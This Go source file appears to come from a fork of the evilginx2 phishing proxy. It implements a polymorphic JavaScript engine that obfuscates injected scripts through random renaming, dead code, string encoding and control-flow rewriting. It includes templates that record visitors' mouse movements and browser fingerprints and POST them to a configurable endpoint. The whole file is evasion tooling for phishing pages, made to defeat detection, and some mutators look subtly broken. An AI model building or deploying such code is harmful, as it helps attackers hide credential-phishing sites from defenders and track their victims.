package core

import (
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math"
	mathrand "math/rand"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// PolymorphicEngine generates unique JavaScript mutations
type PolymorphicEngine struct {
	config       *PolymorphicConfig
	mutators     []Mutator
	templates    map[string]*JSTemplate
	cache        map[string]string
	cacheMutex   sync.RWMutex
	stats        *PolymorphicStats
}

// PolymorphicConfig holds configuration for the polymorphic engine
type PolymorphicConfig struct {
	Enabled           bool                      `json:"enabled" yaml:"enabled"`
	MutationLevel     string                    `json:"mutation_level" yaml:"mutation_level"` // low, medium, high, extreme
	CacheEnabled      bool                      `json:"cache_enabled" yaml:"cache_enabled"`
	CacheDuration     int                       `json:"cache_duration" yaml:"cache_duration"` // minutes
	SeedRotation      int                       `json:"seed_rotation" yaml:"seed_rotation"` // minutes
	EnabledMutations  map[string]bool           `json:"enabled_mutations" yaml:"enabled_mutations"`
	TemplateMode      bool                      `json:"template_mode" yaml:"template_mode"`
	PreserveSemantics bool                      `json:"preserve_semantics" yaml:"preserve_semantics"`
}

// Mutator interface for different mutation strategies
type Mutator interface {
	Name() string
	Mutate(code string, seed int64) string
	IsEnabled() bool
}

// JSTemplate represents a JavaScript template with mutation points
type JSTemplate struct {
	Name        string
	Base        string
	Variables   []string
	Functions   []string
	Expressions []string
}

// PolymorphicStats tracks mutation statistics
type PolymorphicStats struct {
	TotalMutations   int64
	UniqueVariants   int64
	CacheHits        int64
	MutationTimes    map[string]int64
	AverageComplexity float64
	mu               sync.RWMutex
}

// MutationContext holds context for a mutation operation
type MutationContext struct {
	Seed       int64
	SessionID  string
	Timestamp  int64
	Complexity int
}

// NewPolymorphicEngine creates a new polymorphic JavaScript engine
func NewPolymorphicEngine(config *PolymorphicConfig) *PolymorphicEngine {
	pe := &PolymorphicEngine{
		config:    config,
		mutators:  make([]Mutator, 0),
		templates: make(map[string]*JSTemplate),
		cache:     make(map[string]string),
		stats: &PolymorphicStats{
			MutationTimes: make(map[string]int64),
		},
	}
	
	// Initialize mutators
	pe.initializeMutators()
	
	// Initialize templates
	pe.initializeTemplates()
	
	// Start cache cleanup if enabled
	if config.CacheEnabled {
		go pe.cacheCleanupWorker()
	}
	
	return pe
}

// initializeMutators sets up all mutation strategies
func (pe *PolymorphicEngine) initializeMutators() {
	// Variable name mutator
	if pe.isMutationEnabled("variables") {
		pe.mutators = append(pe.mutators, &VariableNameMutator{config: pe.config})
	}
	
	// Function reordering mutator
	if pe.isMutationEnabled("functions") {
		pe.mutators = append(pe.mutators, &FunctionReorderMutator{config: pe.config})
	}
	
	// Dead code injection mutator
	if pe.isMutationEnabled("deadcode") {
		pe.mutators = append(pe.mutators, &DeadCodeMutator{config: pe.config})
	}
	
	// Control flow mutator
	if pe.isMutationEnabled("controlflow") {
		pe.mutators = append(pe.mutators, &ControlFlowMutator{config: pe.config})
	}
	
	// String encoding mutator
	if pe.isMutationEnabled("strings") {
		pe.mutators = append(pe.mutators, &StringEncodingMutator{config: pe.config})
	}
	
	// Math expression mutator
	if pe.isMutationEnabled("math") {
		pe.mutators = append(pe.mutators, &MathExpressionMutator{config: pe.config})
	}
	
	// Comment mutator
	if pe.isMutationEnabled("comments") {
		pe.mutators = append(pe.mutators, &CommentMutator{config: pe.config})
	}
	
	// Whitespace mutator
	if pe.isMutationEnabled("whitespace") {
		pe.mutators = append(pe.mutators, &WhitespaceMutator{config: pe.config})
	}
}

// initializeTemplates sets up JavaScript templates
func (pe *PolymorphicEngine) initializeTemplates() {
	// Behavior collector template
	pe.templates["behavior_collector"] = &JSTemplate{
		Name: "behavior_collector",
		Base: `
(function() {
	var {{collector}} = {
		{{mouse}}: [],
		{{keyboard}}: [],
		{{timing}}: {{getTime}}()
	};
	
	{{docListener}}('mousemove', function({{event}}) {
		{{collector}}.{{mouse}}.push({
			x: {{event}}.clientX,
			y: {{event}}.clientY,
			t: {{getTime}}() - {{collector}}.{{timing}}
		});
	});
	
	{{sendData}} = function() {
		var {{xhr}} = new XMLHttpRequest();
		{{xhr}}.open('POST', '{{endpoint}}');
		{{xhr}}.send(JSON.stringify({{collector}}));
	};
	
	setTimeout({{sendData}}, {{delay}});
})();
`,
		Variables: []string{"collector", "mouse", "keyboard", "timing", "event", "xhr"},
		Functions: []string{"sendData", "getTime", "docListener"},
		Expressions: []string{"delay", "endpoint"},
	}
	
	// Fingerprint collector template
	pe.templates["fingerprint"] = &JSTemplate{
		Name: "fingerprint",
		Base: `
var {{fpCollector}} = function() {
	var {{result}} = {};
	
	{{result}}.{{screen}} = {
		w: screen.width,
		h: screen.height,
		d: screen.colorDepth
	};
	
	{{result}}.{{canvas}} = {{getCanvasData}}();
	{{result}}.{{webgl}} = {{getWebGLData}}();
	
	return {{result}};
};

function {{getCanvasData}}() {
	var {{cvs}} = document.createElement('canvas');
	var {{ctx}} = {{cvs}}.getContext('2d');
	{{ctx}}.font = '14px Arial';
	{{ctx}}.fillText('{{text}}', 10, 20);
	return {{cvs}}.toDataURL();
}
`,
		Variables: []string{"fpCollector", "result", "screen", "canvas", "webgl", "cvs", "ctx"},
		Functions: []string{"getCanvasData", "getWebGLData"},
		Expressions: []string{"text"},
	}
}

// Mutate performs polymorphic mutation on JavaScript code
func (pe *PolymorphicEngine) Mutate(code string, context *MutationContext) string {
	start := time.Now()
	
	// Update stats
	pe.stats.mu.Lock()
	pe.stats.TotalMutations++
	pe.stats.mu.Unlock()
	
	// Check cache if enabled
	if pe.config.CacheEnabled {
		cacheKey := pe.getCacheKey(code, context)
		if cached := pe.getCachedMutation(cacheKey); cached != "" {
			pe.stats.mu.Lock()
			pe.stats.CacheHits++
			pe.stats.mu.Unlock()
			return cached
		}
	}
	
	// Generate seed if not provided
	if context.Seed == 0 {
		context.Seed = pe.generateSeed(context)
	}
	
	// Apply mutations in sequence
	mutated := code
	for _, mutator := range pe.mutators {
		if mutator.IsEnabled() {
			mutated = mutator.Mutate(mutated, context.Seed)
		}
	}
	
	// Cache result
	if pe.config.CacheEnabled {
		cacheKey := pe.getCacheKey(code, context)
		pe.cacheMutation(cacheKey, mutated)
	}
	
	// Update stats
	elapsed := time.Since(start)
	pe.stats.mu.Lock()
	pe.stats.MutationTimes[context.SessionID] = elapsed.Nanoseconds()
	pe.stats.mu.Unlock()
	
	log.Debug("Polymorphic mutation completed in %v", elapsed)
	
	return mutated
}

// MutateTemplate mutates a JavaScript template
func (pe *PolymorphicEngine) MutateTemplate(templateName string, context *MutationContext, params map[string]string) (string, error) {
	template, exists := pe.templates[templateName]
	if !exists {
		return "", fmt.Errorf("template not found: %s", templateName)
	}
	
	// Generate seed
	if context.Seed == 0 {
		context.Seed = pe.generateSeed(context)
	}
	
	// Create RNG from seed
	rng := mathrand.New(mathrand.NewSource(context.Seed))
	
	// Start with template base
	code := template.Base
	
	// Replace variables with random names
	varMap := make(map[string]string)
	for _, v := range template.Variables {
		varMap[v] = pe.generateRandomVariable(rng)
	}
	
	// Replace functions with random names
	funcMap := make(map[string]string)
	for _, f := range template.Functions {
		funcMap[f] = pe.generateRandomFunction(rng)
	}
	
	// Apply replacements
	for old, new := range varMap {
		code = strings.ReplaceAll(code, "{{"+old+"}}", new)
	}
	
	for old, new := range funcMap {
		code = strings.ReplaceAll(code, "{{"+old+"}}", new)
	}
	
	// Apply parameter replacements
	for key, value := range params {
		code = strings.ReplaceAll(code, "{{"+key+"}}", value)
	}
	
	// Apply additional mutations
	return pe.Mutate(code, context), nil
}

// generateSeed generates a mutation seed
func (pe *PolymorphicEngine) generateSeed(context *MutationContext) int64 {
	// Combine multiple factors for seed generation
	h := md5.New()
	h.Write([]byte(context.SessionID))
	h.Write([]byte(strconv.FormatInt(context.Timestamp, 10)))
	
	// Add rotation factor
	if pe.config.SeedRotation > 0 {
		rotation := context.Timestamp / (int64(pe.config.SeedRotation) * 60)
		h.Write([]byte(strconv.FormatInt(rotation, 10)))
	}
	
	hash := h.Sum(nil)
	seed := int64(0)
	for i := 0; i < 8; i++ {
		seed = (seed << 8) | int64(hash[i])
	}
	
	return seed
}

// generateRandomVariable generates a random variable name
func (pe *PolymorphicEngine) generateRandomVariable(rng *mathrand.Rand) string {
	prefixes := []string{"_", "$", "v", "var", "val", "obj", "data", "tmp", "ret"}
	prefix := prefixes[rng.Intn(len(prefixes))]
	
	// Generate random suffix
	suffix := make([]byte, 4+rng.Intn(4))
	for i := range suffix {
		if i == 0 || rng.Float32() < 0.5 {
			suffix[i] = byte('a' + rng.Intn(26))
		} else {
			suffix[i] = byte('0' + rng.Intn(10))
		}
	}
	
	return prefix + string(suffix)
}

// generateRandomFunction generates a random function name
func (pe *PolymorphicEngine) generateRandomFunction(rng *mathrand.Rand) string {
	prefixes := []string{"fn", "func", "do", "get", "set", "handle", "process", "exec"}
	prefix := prefixes[rng.Intn(len(prefixes))]
	
	// Generate camelCase suffix
	words := []string{"Data", "Value", "Item", "Object", "Result", "Info", "Status", "Config"}
	suffix := words[rng.Intn(len(words))]
	
	if rng.Float32() < 0.5 {
		suffix += words[rng.Intn(len(words))]
	}
	
	return prefix + suffix
}

// getCacheKey generates a cache key
func (pe *PolymorphicEngine) getCacheKey(code string, context *MutationContext) string {
	h := md5.New()
	h.Write([]byte(code))
	h.Write([]byte(strconv.FormatInt(context.Seed, 10)))
	return hex.EncodeToString(h.Sum(nil))
}

// getCachedMutation retrieves cached mutation
func (pe *PolymorphicEngine) getCachedMutation(key string) string {
	pe.cacheMutex.RLock()
	defer pe.cacheMutex.RUnlock()
	
	return pe.cache[key]
}

// cacheMutation stores mutation in cache
func (pe *PolymorphicEngine) cacheMutation(key string, mutated string) {
	pe.cacheMutex.Lock()
	defer pe.cacheMutex.Unlock()
	
	pe.cache[key] = mutated
}

// cacheCleanupWorker periodically cleans up cache
func (pe *PolymorphicEngine) cacheCleanupWorker() {
	ticker := time.NewTicker(time.Duration(pe.config.CacheDuration) * time.Minute)
	defer ticker.Stop()
	
	for range ticker.C {
		pe.clearCache()
	}
}

// clearCache clears the mutation cache
func (pe *PolymorphicEngine) clearCache() {
	pe.cacheMutex.Lock()
	defer pe.cacheMutex.Unlock()
	
	pe.cache = make(map[string]string)
	log.Debug("Polymorphic cache cleared")
}

// isMutationEnabled checks if a mutation type is enabled
func (pe *PolymorphicEngine) isMutationEnabled(mutation string) bool {
	if pe.config.EnabledMutations == nil {
		return true // All enabled by default
	}
	
	enabled, exists := pe.config.EnabledMutations[mutation]
	return !exists || enabled
}

// GetStats returns engine statistics
func (pe *PolymorphicEngine) GetStats() map[string]interface{} {
	pe.stats.mu.RLock()
	defer pe.stats.mu.RUnlock()
	
	return map[string]interface{}{
		"total_mutations":    pe.stats.TotalMutations,
		"unique_variants":    pe.stats.UniqueVariants,
		"cache_hits":         pe.stats.CacheHits,
		"average_complexity": pe.stats.AverageComplexity,
		"cache_size":         len(pe.cache),
	}
}

// Mutator Implementations

// VariableNameMutator renames variables
type VariableNameMutator struct {
	config *PolymorphicConfig
}

func (m *VariableNameMutator) Name() string { return "variables" }
func (m *VariableNameMutator) IsEnabled() bool { return true }

func (m *VariableNameMutator) Mutate(code string, seed int64) string {
	rng := mathrand.New(mathrand.NewSource(seed))
	
	// Find all variable declarations
	varPattern := regexp.MustCompile(`\b(var|let|const)\s+([a-zA-Z_$][a-zA-Z0-9_$]*)\b`)
	
	// Build replacement map
	replacements := make(map[string]string)
	
	matches := varPattern.FindAllStringSubmatch(code, -1)
	for _, match := range matches {
		varName := match[2]
		if _, exists := replacements[varName]; !exists {
			// Skip certain reserved names
			if isReservedName(varName) {
				continue
			}
			replacements[varName] = generateVarName(rng)
		}
	}
	
	// Apply replacements
	result := code
	for old, new := range replacements {
		// Replace variable usage (not in strings)
		pattern := fmt.Sprintf(`\b%s\b`, regexp.QuoteMeta(old))
		re := regexp.MustCompile(pattern)
		result = re.ReplaceAllStringFunc(result, func(match string) string {
			// Check if in string literal
			if isInString(result, match) {
				return match
			}
			return new
		})
	}
	
	return result
}

// FunctionReorderMutator reorders function declarations
type FunctionReorderMutator struct {
	config *PolymorphicConfig
}

func (m *FunctionReorderMutator) Name() string { return "functions" }
func (m *FunctionReorderMutator) IsEnabled() bool { return true }

func (m *FunctionReorderMutator) Mutate(code string, seed int64) string {
	rng := mathrand.New(mathrand.NewSource(seed))
	
	// Extract function declarations
	funcPattern := regexp.MustCompile(`(?m)^function\s+[^{]+\{[^}]*\}`)
	functions := funcPattern.FindAllString(code, -1)
	
	if len(functions) <= 1 {
		return code
	}
	
	// Shuffle functions
	shuffled := make([]string, len(functions))
	copy(shuffled, functions)
	
	for i := len(shuffled) - 1; i > 0; i-- {
		j := rng.Intn(i + 1)
		shuffled[i], shuffled[j] = shuffled[j], shuffled[i]
	}
	
	// Replace original order with shuffled
	result := code
	for i, original := range functions {
		result = strings.Replace(result, original, "<<FUNC_"+strconv.Itoa(i)+">>", 1)
	}
	
	for i, shuffled := range shuffled {
		result = strings.Replace(result, "<<FUNC_"+strconv.Itoa(i)+">>", shuffled, 1)
	}
	
	return result
}

// DeadCodeMutator injects dead code
type DeadCodeMutator struct {
	config *PolymorphicConfig
}

func (m *DeadCodeMutator) Name() string { return "deadcode" }
func (m *DeadCodeMutator) IsEnabled() bool { return true }

func (m *DeadCodeMutator) Mutate(code string, seed int64) string {
	rng := mathrand.New(mathrand.NewSource(seed))
	
	// Dead code templates
	deadCodeTemplates := []string{
		"if (false) { %s }",
		"while (false) { %s }",
		"if (Math.random() < 0) { %s }",
		"function %s() { %s } // unused",
		"var %s = function() { %s };",
		"try { } catch(%s) { %s }",
	}
	
	// Insert dead code at random positions
	lines := strings.Split(code, "\n")
	insertCount := 2 + rng.Intn(3)
	
	for i := 0; i < insertCount && len(lines) > 3; i++ {
		position := 1 + rng.Intn(len(lines)-2)
		
		template := deadCodeTemplates[rng.Intn(len(deadCodeTemplates))]
		deadCode := fmt.Sprintf(template, generateDeadCodeContent(rng), generateVarName(rng))
		
		// Insert dead code
		lines = append(lines[:position], append([]string{deadCode}, lines[position:]...)...)
	}
	
	return strings.Join(lines, "\n")
}

// ControlFlowMutator modifies control flow
type ControlFlowMutator struct {
	config *PolymorphicConfig
}

func (m *ControlFlowMutator) Name() string { return "controlflow" }
func (m *ControlFlowMutator) IsEnabled() bool { return true }

func (m *ControlFlowMutator) Mutate(code string, seed int64) string {
	rng := mathrand.New(mathrand.NewSource(seed))
	
	// Simple if statements to ternary
	ifPattern := regexp.MustCompile(`if\s*\(([^)]+)\)\s*\{\s*([^;]+);\s*\}\s*else\s*\{\s*([^;]+);\s*\}`)
	code = ifPattern.ReplaceAllStringFunc(code, func(match string) string {
		if rng.Float32() < 0.5 {
			return match // Keep original sometimes
		}
		
		parts := ifPattern.FindStringSubmatch(match)
		if len(parts) == 4 {
			return fmt.Sprintf("(%s) ? %s : %s;", parts[1], parts[2], parts[3])
		}
		return match
	})
	
	// Transform for loops to while loops sometimes
	forPattern := regexp.MustCompile(`for\s*\(([^;]+);\s*([^;]+);\s*([^)]+)\)\s*\{`)
	code = forPattern.ReplaceAllStringFunc(code, func(match string) string {
		if rng.Float32() < 0.3 {
			parts := forPattern.FindStringSubmatch(match)
			if len(parts) == 4 {
				return fmt.Sprintf("%s;\nwhile (%s) {\n%s;", parts[1], parts[2], parts[3])
			}
		}
		return match
	})
	
	return code
}

// StringEncodingMutator encodes strings differently
type StringEncodingMutator struct {
	config *PolymorphicConfig
}

func (m *StringEncodingMutator) Name() string { return "strings" }
func (m *StringEncodingMutator) IsEnabled() bool { return true }

func (m *StringEncodingMutator) Mutate(code string, seed int64) string {
	rng := mathrand.New(mathrand.NewSource(seed))
	
	// Find string literals
	stringPattern := regexp.MustCompile(`"([^"\\]*(\\.[^"\\]*)*)"`)
	
	code = stringPattern.ReplaceAllStringFunc(code, func(match string) string {
		// Extract the string content
		content := match[1 : len(match)-1]
		
		// Skip short strings
		if len(content) < 4 {
			return match
		}
		
		// Apply random encoding
		switch rng.Intn(4) {
		case 0:
			// Hex encoding
			hex := ""
			for _, ch := range content {
				hex += fmt.Sprintf("\\x%02x", ch)
			}
			return fmt.Sprintf(`"%s"`, hex)
			
		case 1:
			// Base64 encoding
			b64 := base64.StdEncoding.EncodeToString([]byte(content))
			return fmt.Sprintf(`atob("%s")`, b64)
			
		case 2:
			// Character code array
			codes := []string{}
			for _, ch := range content {
				codes = append(codes, strconv.Itoa(int(ch)))
			}
			return fmt.Sprintf(`String.fromCharCode(%s)`, strings.Join(codes, ","))
			
		default:
			return match
		}
	})
	
	return code
}

// MathExpressionMutator mutates mathematical expressions
type MathExpressionMutator struct {
	config *PolymorphicConfig
}

func (m *MathExpressionMutator) Name() string { return "math" }
func (m *MathExpressionMutator) IsEnabled() bool { return true }

func (m *MathExpressionMutator) Mutate(code string, seed int64) string {
	rng := mathrand.New(mathrand.NewSource(seed))
	
	// Find simple number literals
	numberPattern := regexp.MustCompile(`\b(\d+)\b`)
	
	code = numberPattern.ReplaceAllStringFunc(code, func(match string) string {
		num, err := strconv.Atoi(match)
		if err != nil || num < 2 {
			return match
		}
		
		// Apply random transformation
		if rng.Float32() < 0.3 {
			switch rng.Intn(3) {
			case 0:
				// Addition
				a := rng.Intn(num)
				b := num - a
				return fmt.Sprintf("(%d+%d)", a, b)
			case 1:
				// Multiplication
				for i := 2; i <= int(math.Sqrt(float64(num))); i++ {
					if num%i == 0 {
						return fmt.Sprintf("(%d*%d)", i, num/i)
					}
				}
			case 2:
				// Bitwise operations
				if num < 1000 {
					return fmt.Sprintf("(0x%x)", num)
				}
			}
		}
		
		return match
	})
	
	return code
}

// CommentMutator adds/modifies comments
type CommentMutator struct {
	config *PolymorphicConfig
}

func (m *CommentMutator) Name() string { return "comments" }
func (m *CommentMutator) IsEnabled() bool { return true }

func (m *CommentMutator) Mutate(code string, seed int64) string {
	rng := mathrand.New(mathrand.NewSource(seed))
	
	// Random comment templates
	comments := []string{
		"// Generated: %s",
		"/* Module: %s */",
		"// Version: %d.%d.%d",
		"/* eslint-disable */",
		"// @ts-nocheck",
		"/** @preserve */",
	}
	
	lines := strings.Split(code, "\n")
	
	// Add comments at random positions
	insertCount := 1 + rng.Intn(3)
	for i := 0; i < insertCount && len(lines) > 2; i++ {
		position := rng.Intn(len(lines))
		comment := fmt.Sprintf(comments[rng.Intn(len(comments))], 
			generateRandomString(rng, 8),
			rng.Intn(10),
			rng.Intn(99))
		
		lines = append(lines[:position], append([]string{comment}, lines[position:]...)...)
	}
	
	return strings.Join(lines, "\n")
}

// WhitespaceMutator modifies whitespace
type WhitespaceMutator struct {
	config *PolymorphicConfig
}

func (m *WhitespaceMutator) Name() string { return "whitespace" }
func (m *WhitespaceMutator) IsEnabled() bool { return true }

func (m *WhitespaceMutator) Mutate(code string, seed int64) string {
	rng := mathrand.New(mathrand.NewSource(seed))
	
	// Random whitespace operations
	operations := []func(string, *mathrand.Rand) string{
		addRandomIndentation,
		randomizeLineBreaks,
		addTrailingSpaces,
		compressWhitespace,
	}
	
	// Apply 1-2 random operations
	opCount := 1 + rng.Intn(2)
	for i := 0; i < opCount; i++ {
		op := operations[rng.Intn(len(operations))]
		code = op(code, rng)
	}
	
	return code
}

// Helper functions

func isReservedName(name string) bool {
	reserved := []string{
		"document", "window", "console", "Math", "Object", "Array",
		"String", "Number", "Boolean", "Function", "Date", "RegExp",
		"Error", "JSON", "undefined", "null", "true", "false",
		"this", "self", "global", "XMLHttpRequest",
	}
	
	for _, r := range reserved {
		if name == r {
			return true
		}
	}
	return false
}

func generateVarName(rng *mathrand.Rand) string {
	length := 4 + rng.Intn(4)
	name := make([]byte, length)
	
	// First character must be letter or underscore
	if rng.Float32() < 0.8 {
		name[0] = byte('a' + rng.Intn(26))
	} else {
		name[0] = '_'
	}
	
	// Remaining characters
	for i := 1; i < length; i++ {
		switch rng.Intn(3) {
		case 0:
			name[i] = byte('a' + rng.Intn(26))
		case 1:
			name[i] = byte('A' + rng.Intn(26))
		case 2:
			name[i] = byte('0' + rng.Intn(10))
		}
	}
	
	return string(name)
}

func generateRandomString(rng *mathrand.Rand, length int) string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = chars[rng.Intn(len(chars))]
	}
	return string(result)
}

func generateDeadCodeContent(rng *mathrand.Rand) string {
	templates := []string{
		"var %s = %d;",
		"console.log('%s');",
		"return %d;",
		"throw new Error('%s');",
		"%s++;",
		"break;",
	}
	
	template := templates[rng.Intn(len(templates))]
	return fmt.Sprintf(template, generateVarName(rng), rng.Intn(1000), generateRandomString(rng, 8))
}

func isInString(code string, match string) bool {
	// Simplified check - in production would need proper parsing
	idx := strings.Index(code, match)
	if idx == -1 {
		return false
	}
	
	// Count quotes before match
	before := code[:idx]
	singleQuotes := strings.Count(before, "'") - strings.Count(before, "\\'")
	doubleQuotes := strings.Count(before, `"`) - strings.Count(before, `\"`)
	
	return (singleQuotes%2 == 1) || (doubleQuotes%2 == 1)
}

func addRandomIndentation(code string, rng *mathrand.Rand) string {
	lines := strings.Split(code, "\n")
	for i := range lines {
		if strings.TrimSpace(lines[i]) != "" && rng.Float32() < 0.3 {
			indent := strings.Repeat(" ", rng.Intn(4))
			lines[i] = indent + lines[i]
		}
	}
	return strings.Join(lines, "\n")
}

func randomizeLineBreaks(code string, rng *mathrand.Rand) string {
	// Add random line breaks after semicolons and braces
	if rng.Float32() < 0.5 {
		code = strings.ReplaceAll(code, ";", ";\n")
		code = strings.ReplaceAll(code, "{", "{\n")
		code = strings.ReplaceAll(code, "}", "}\n")
	}
	return code
}

func addTrailingSpaces(code string, rng *mathrand.Rand) string {
	lines := strings.Split(code, "\n")
	for i := range lines {
		if rng.Float32() < 0.2 {
			lines[i] += strings.Repeat(" ", rng.Intn(5))
		}
	}
	return strings.Join(lines, "\n")
}

func compressWhitespace(code string, rng *mathrand.Rand) string {
	if rng.Float32() < 0.3 {
		// Remove unnecessary whitespace
		code = regexp.MustCompile(`\s+`).ReplaceAllString(code, " ")
		code = strings.TrimSpace(code)
	}
	return code
}
